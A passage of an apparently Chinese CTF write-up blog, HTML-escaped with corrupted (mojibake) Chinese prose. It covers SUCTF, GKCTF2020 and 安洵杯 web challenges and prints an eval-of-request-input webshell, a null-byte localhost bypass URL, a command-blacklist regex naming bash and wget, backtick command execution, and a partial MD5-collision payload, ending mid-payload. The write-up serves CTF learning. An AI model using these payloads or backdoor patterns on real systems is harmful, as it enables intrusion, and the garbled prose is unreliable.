class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;br&gt;é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;br&gt;ä¸»é…ç½®æ–‡ä»¶ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;nginx&lt;span class=&#34;hljs-regexp&#34;&gt;/conf/&lt;/span&gt;nginx.conf&lt;br&gt;ç®¡ç†è„šæœ¬ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lib64&lt;span class=&#34;hljs-regexp&#34;&gt;/systemd/&lt;/span&gt;system/nginx.service&lt;br&gt;æ¨¡å—ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;lisb64&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/m&lt;/span&gt;odules&lt;br&gt;åº”ç”¨ç¨‹åºï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;sbin/nginx&lt;br&gt;ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;share&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;html&lt;br&gt;æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/nginx&lt;br&gt;é…ç½®æ–‡ä»¶ç›®å½•ä¸ºï¼š&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;local&lt;span class=&#34;hljs-regexp&#34;&gt;/nginx/&lt;/span&gt;conf/nginx.conf&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;/usr/local/nginx/conf/nginx.conf è¯»åˆ° flag ä½ç½® file:////suctf.cc/usr/fffffflag æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ®è¯´é¢„æœŸè§£æ˜¯ &lt;code&gt;file://suctf.câ„†sr/fffffflag&lt;/code&gt; (&lt;a href=&#34;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&#34;&gt;https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gkctf2020checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gkctf2020checkin&#34;&gt;#&lt;/a&gt; [GKCTF2020]CheckIN&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php-template&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php-template&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Check_In&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;xml&#34;&gt;&lt;/span&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;ClassName&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$code&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$decode&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code = @&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;x()[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Ginkgo&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode = @base64_decode( &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;code );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;Eval&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;decode);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;x&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;php&#34;&gt;        &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;php&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; ClassName();&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç»™äº† shellï¼Œå…ˆçœ‹ä¸€ä¸‹ phpinfoï¼Œå‘ç°æœ‰ disable_functionsï¼Œåº”è¯¥æ˜¯é¥¶ disable_functions çš„é¢˜ç›®ï¼Œ &lt;code&gt;/var/tmp/&lt;/code&gt;  å¯ä»¥å†™æ–‡ä»¶ï¼Œå‚è€ƒ LD_PRELOAD çš„ without send_mail æ–¹æ³•ç»•è¿‡ï¼Œåˆ©ç”¨ /readflag å‘½ä»¤æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gkctf2020cveç‰ˆç­¾åˆ°&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gkctf2020cveç‰ˆç­¾åˆ°&#34;&gt;#&lt;/a&gt; [GKCTF2020] cve ç‰ˆç­¾åˆ°&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æç¤º cve-2020-7066ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ %00 æˆªæ–­&lt;/li&gt;
&lt;li&gt;header é‡Œæœ‰ hint æç¤º flag åœ¨ localhost&lt;/li&gt;
&lt;li&gt;è®¿é—®ï¼Ÿurl=127.0.0.1%00.ctfhub.com æ‹¿åˆ°æç¤º host è¦ä»¥ 123 ç»“å°¾&lt;/li&gt;
&lt;li&gt;è®¿é—®ï¼Ÿurl=127.0.0.123%00.ctfhub.com æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019easy_web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å®‰æ´µæ¯-2019easy_web&#34;&gt;#&lt;/a&gt; [å®‰æ´µæ¯ 2019] easy_web&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;url ä¸­çš„ img ç»è¿‡ 2 æ¬¡ base64 è§£ç  + 1 æ¬¡ ASCII Hex è§£ç å¾—åˆ° 555.pngï¼Œäºæ˜¯æŠŠ 555.png æ”¹æˆ index.php è¯»åˆ°æºç &lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;error_reporting(E_ALL || ~ E_NOTICE);&lt;br&gt;header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;content-type:text/html;charset=utf-8&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]) || !&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])) &lt;br&gt;    header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;amp;cmd=&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = hex2bin(base64_decode(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;])));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/[^a-zA-Z0-9.]+/&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/flag/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;img src =&amp;quot;./ctf3.jpeg&amp;quot;&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;xixiï½ no flag&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; = base64_encode(file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;));&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;img src=&amp;#x27;data:image/gif;base64,&amp;quot;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$txt&lt;/span&gt; . &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;#x27;&amp;gt;&amp;lt;/img&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&amp;#x27;|\&amp;quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&amp;#123;|\&amp;#125;|\(|\)|\&amp;amp;[^\d]|@|\||\\$|\[|\]|&amp;#123;|&amp;#125;|\(|\)|-|&amp;lt;|&amp;gt;/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;forbid ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;] !== (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;] &amp;amp;&amp;amp; md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]) === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; `&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt;`;&lt;br&gt;    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;md5 is funny ~&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;lt;style&amp;gt;&lt;br&gt;  body&amp;#123;&lt;br&gt;   background:url(./bj.png)  no-repeat center center;&lt;br&gt;   background-size:cover;&lt;br&gt;   background-attachment:fixed;&lt;br&gt;   background-color:&lt;span class=&#34;hljs-comment&#34;&gt;#CCCCCC;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&amp;lt;/style&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å…¶ä¸­ &lt;code&gt;if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;amp;&amp;amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))&lt;/code&gt;  åˆ©ç”¨ payload&lt;/p&gt;
&lt;figure class=&#34;highlight llvm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs llvm&#34;&gt;a&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&amp;amp;b&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span 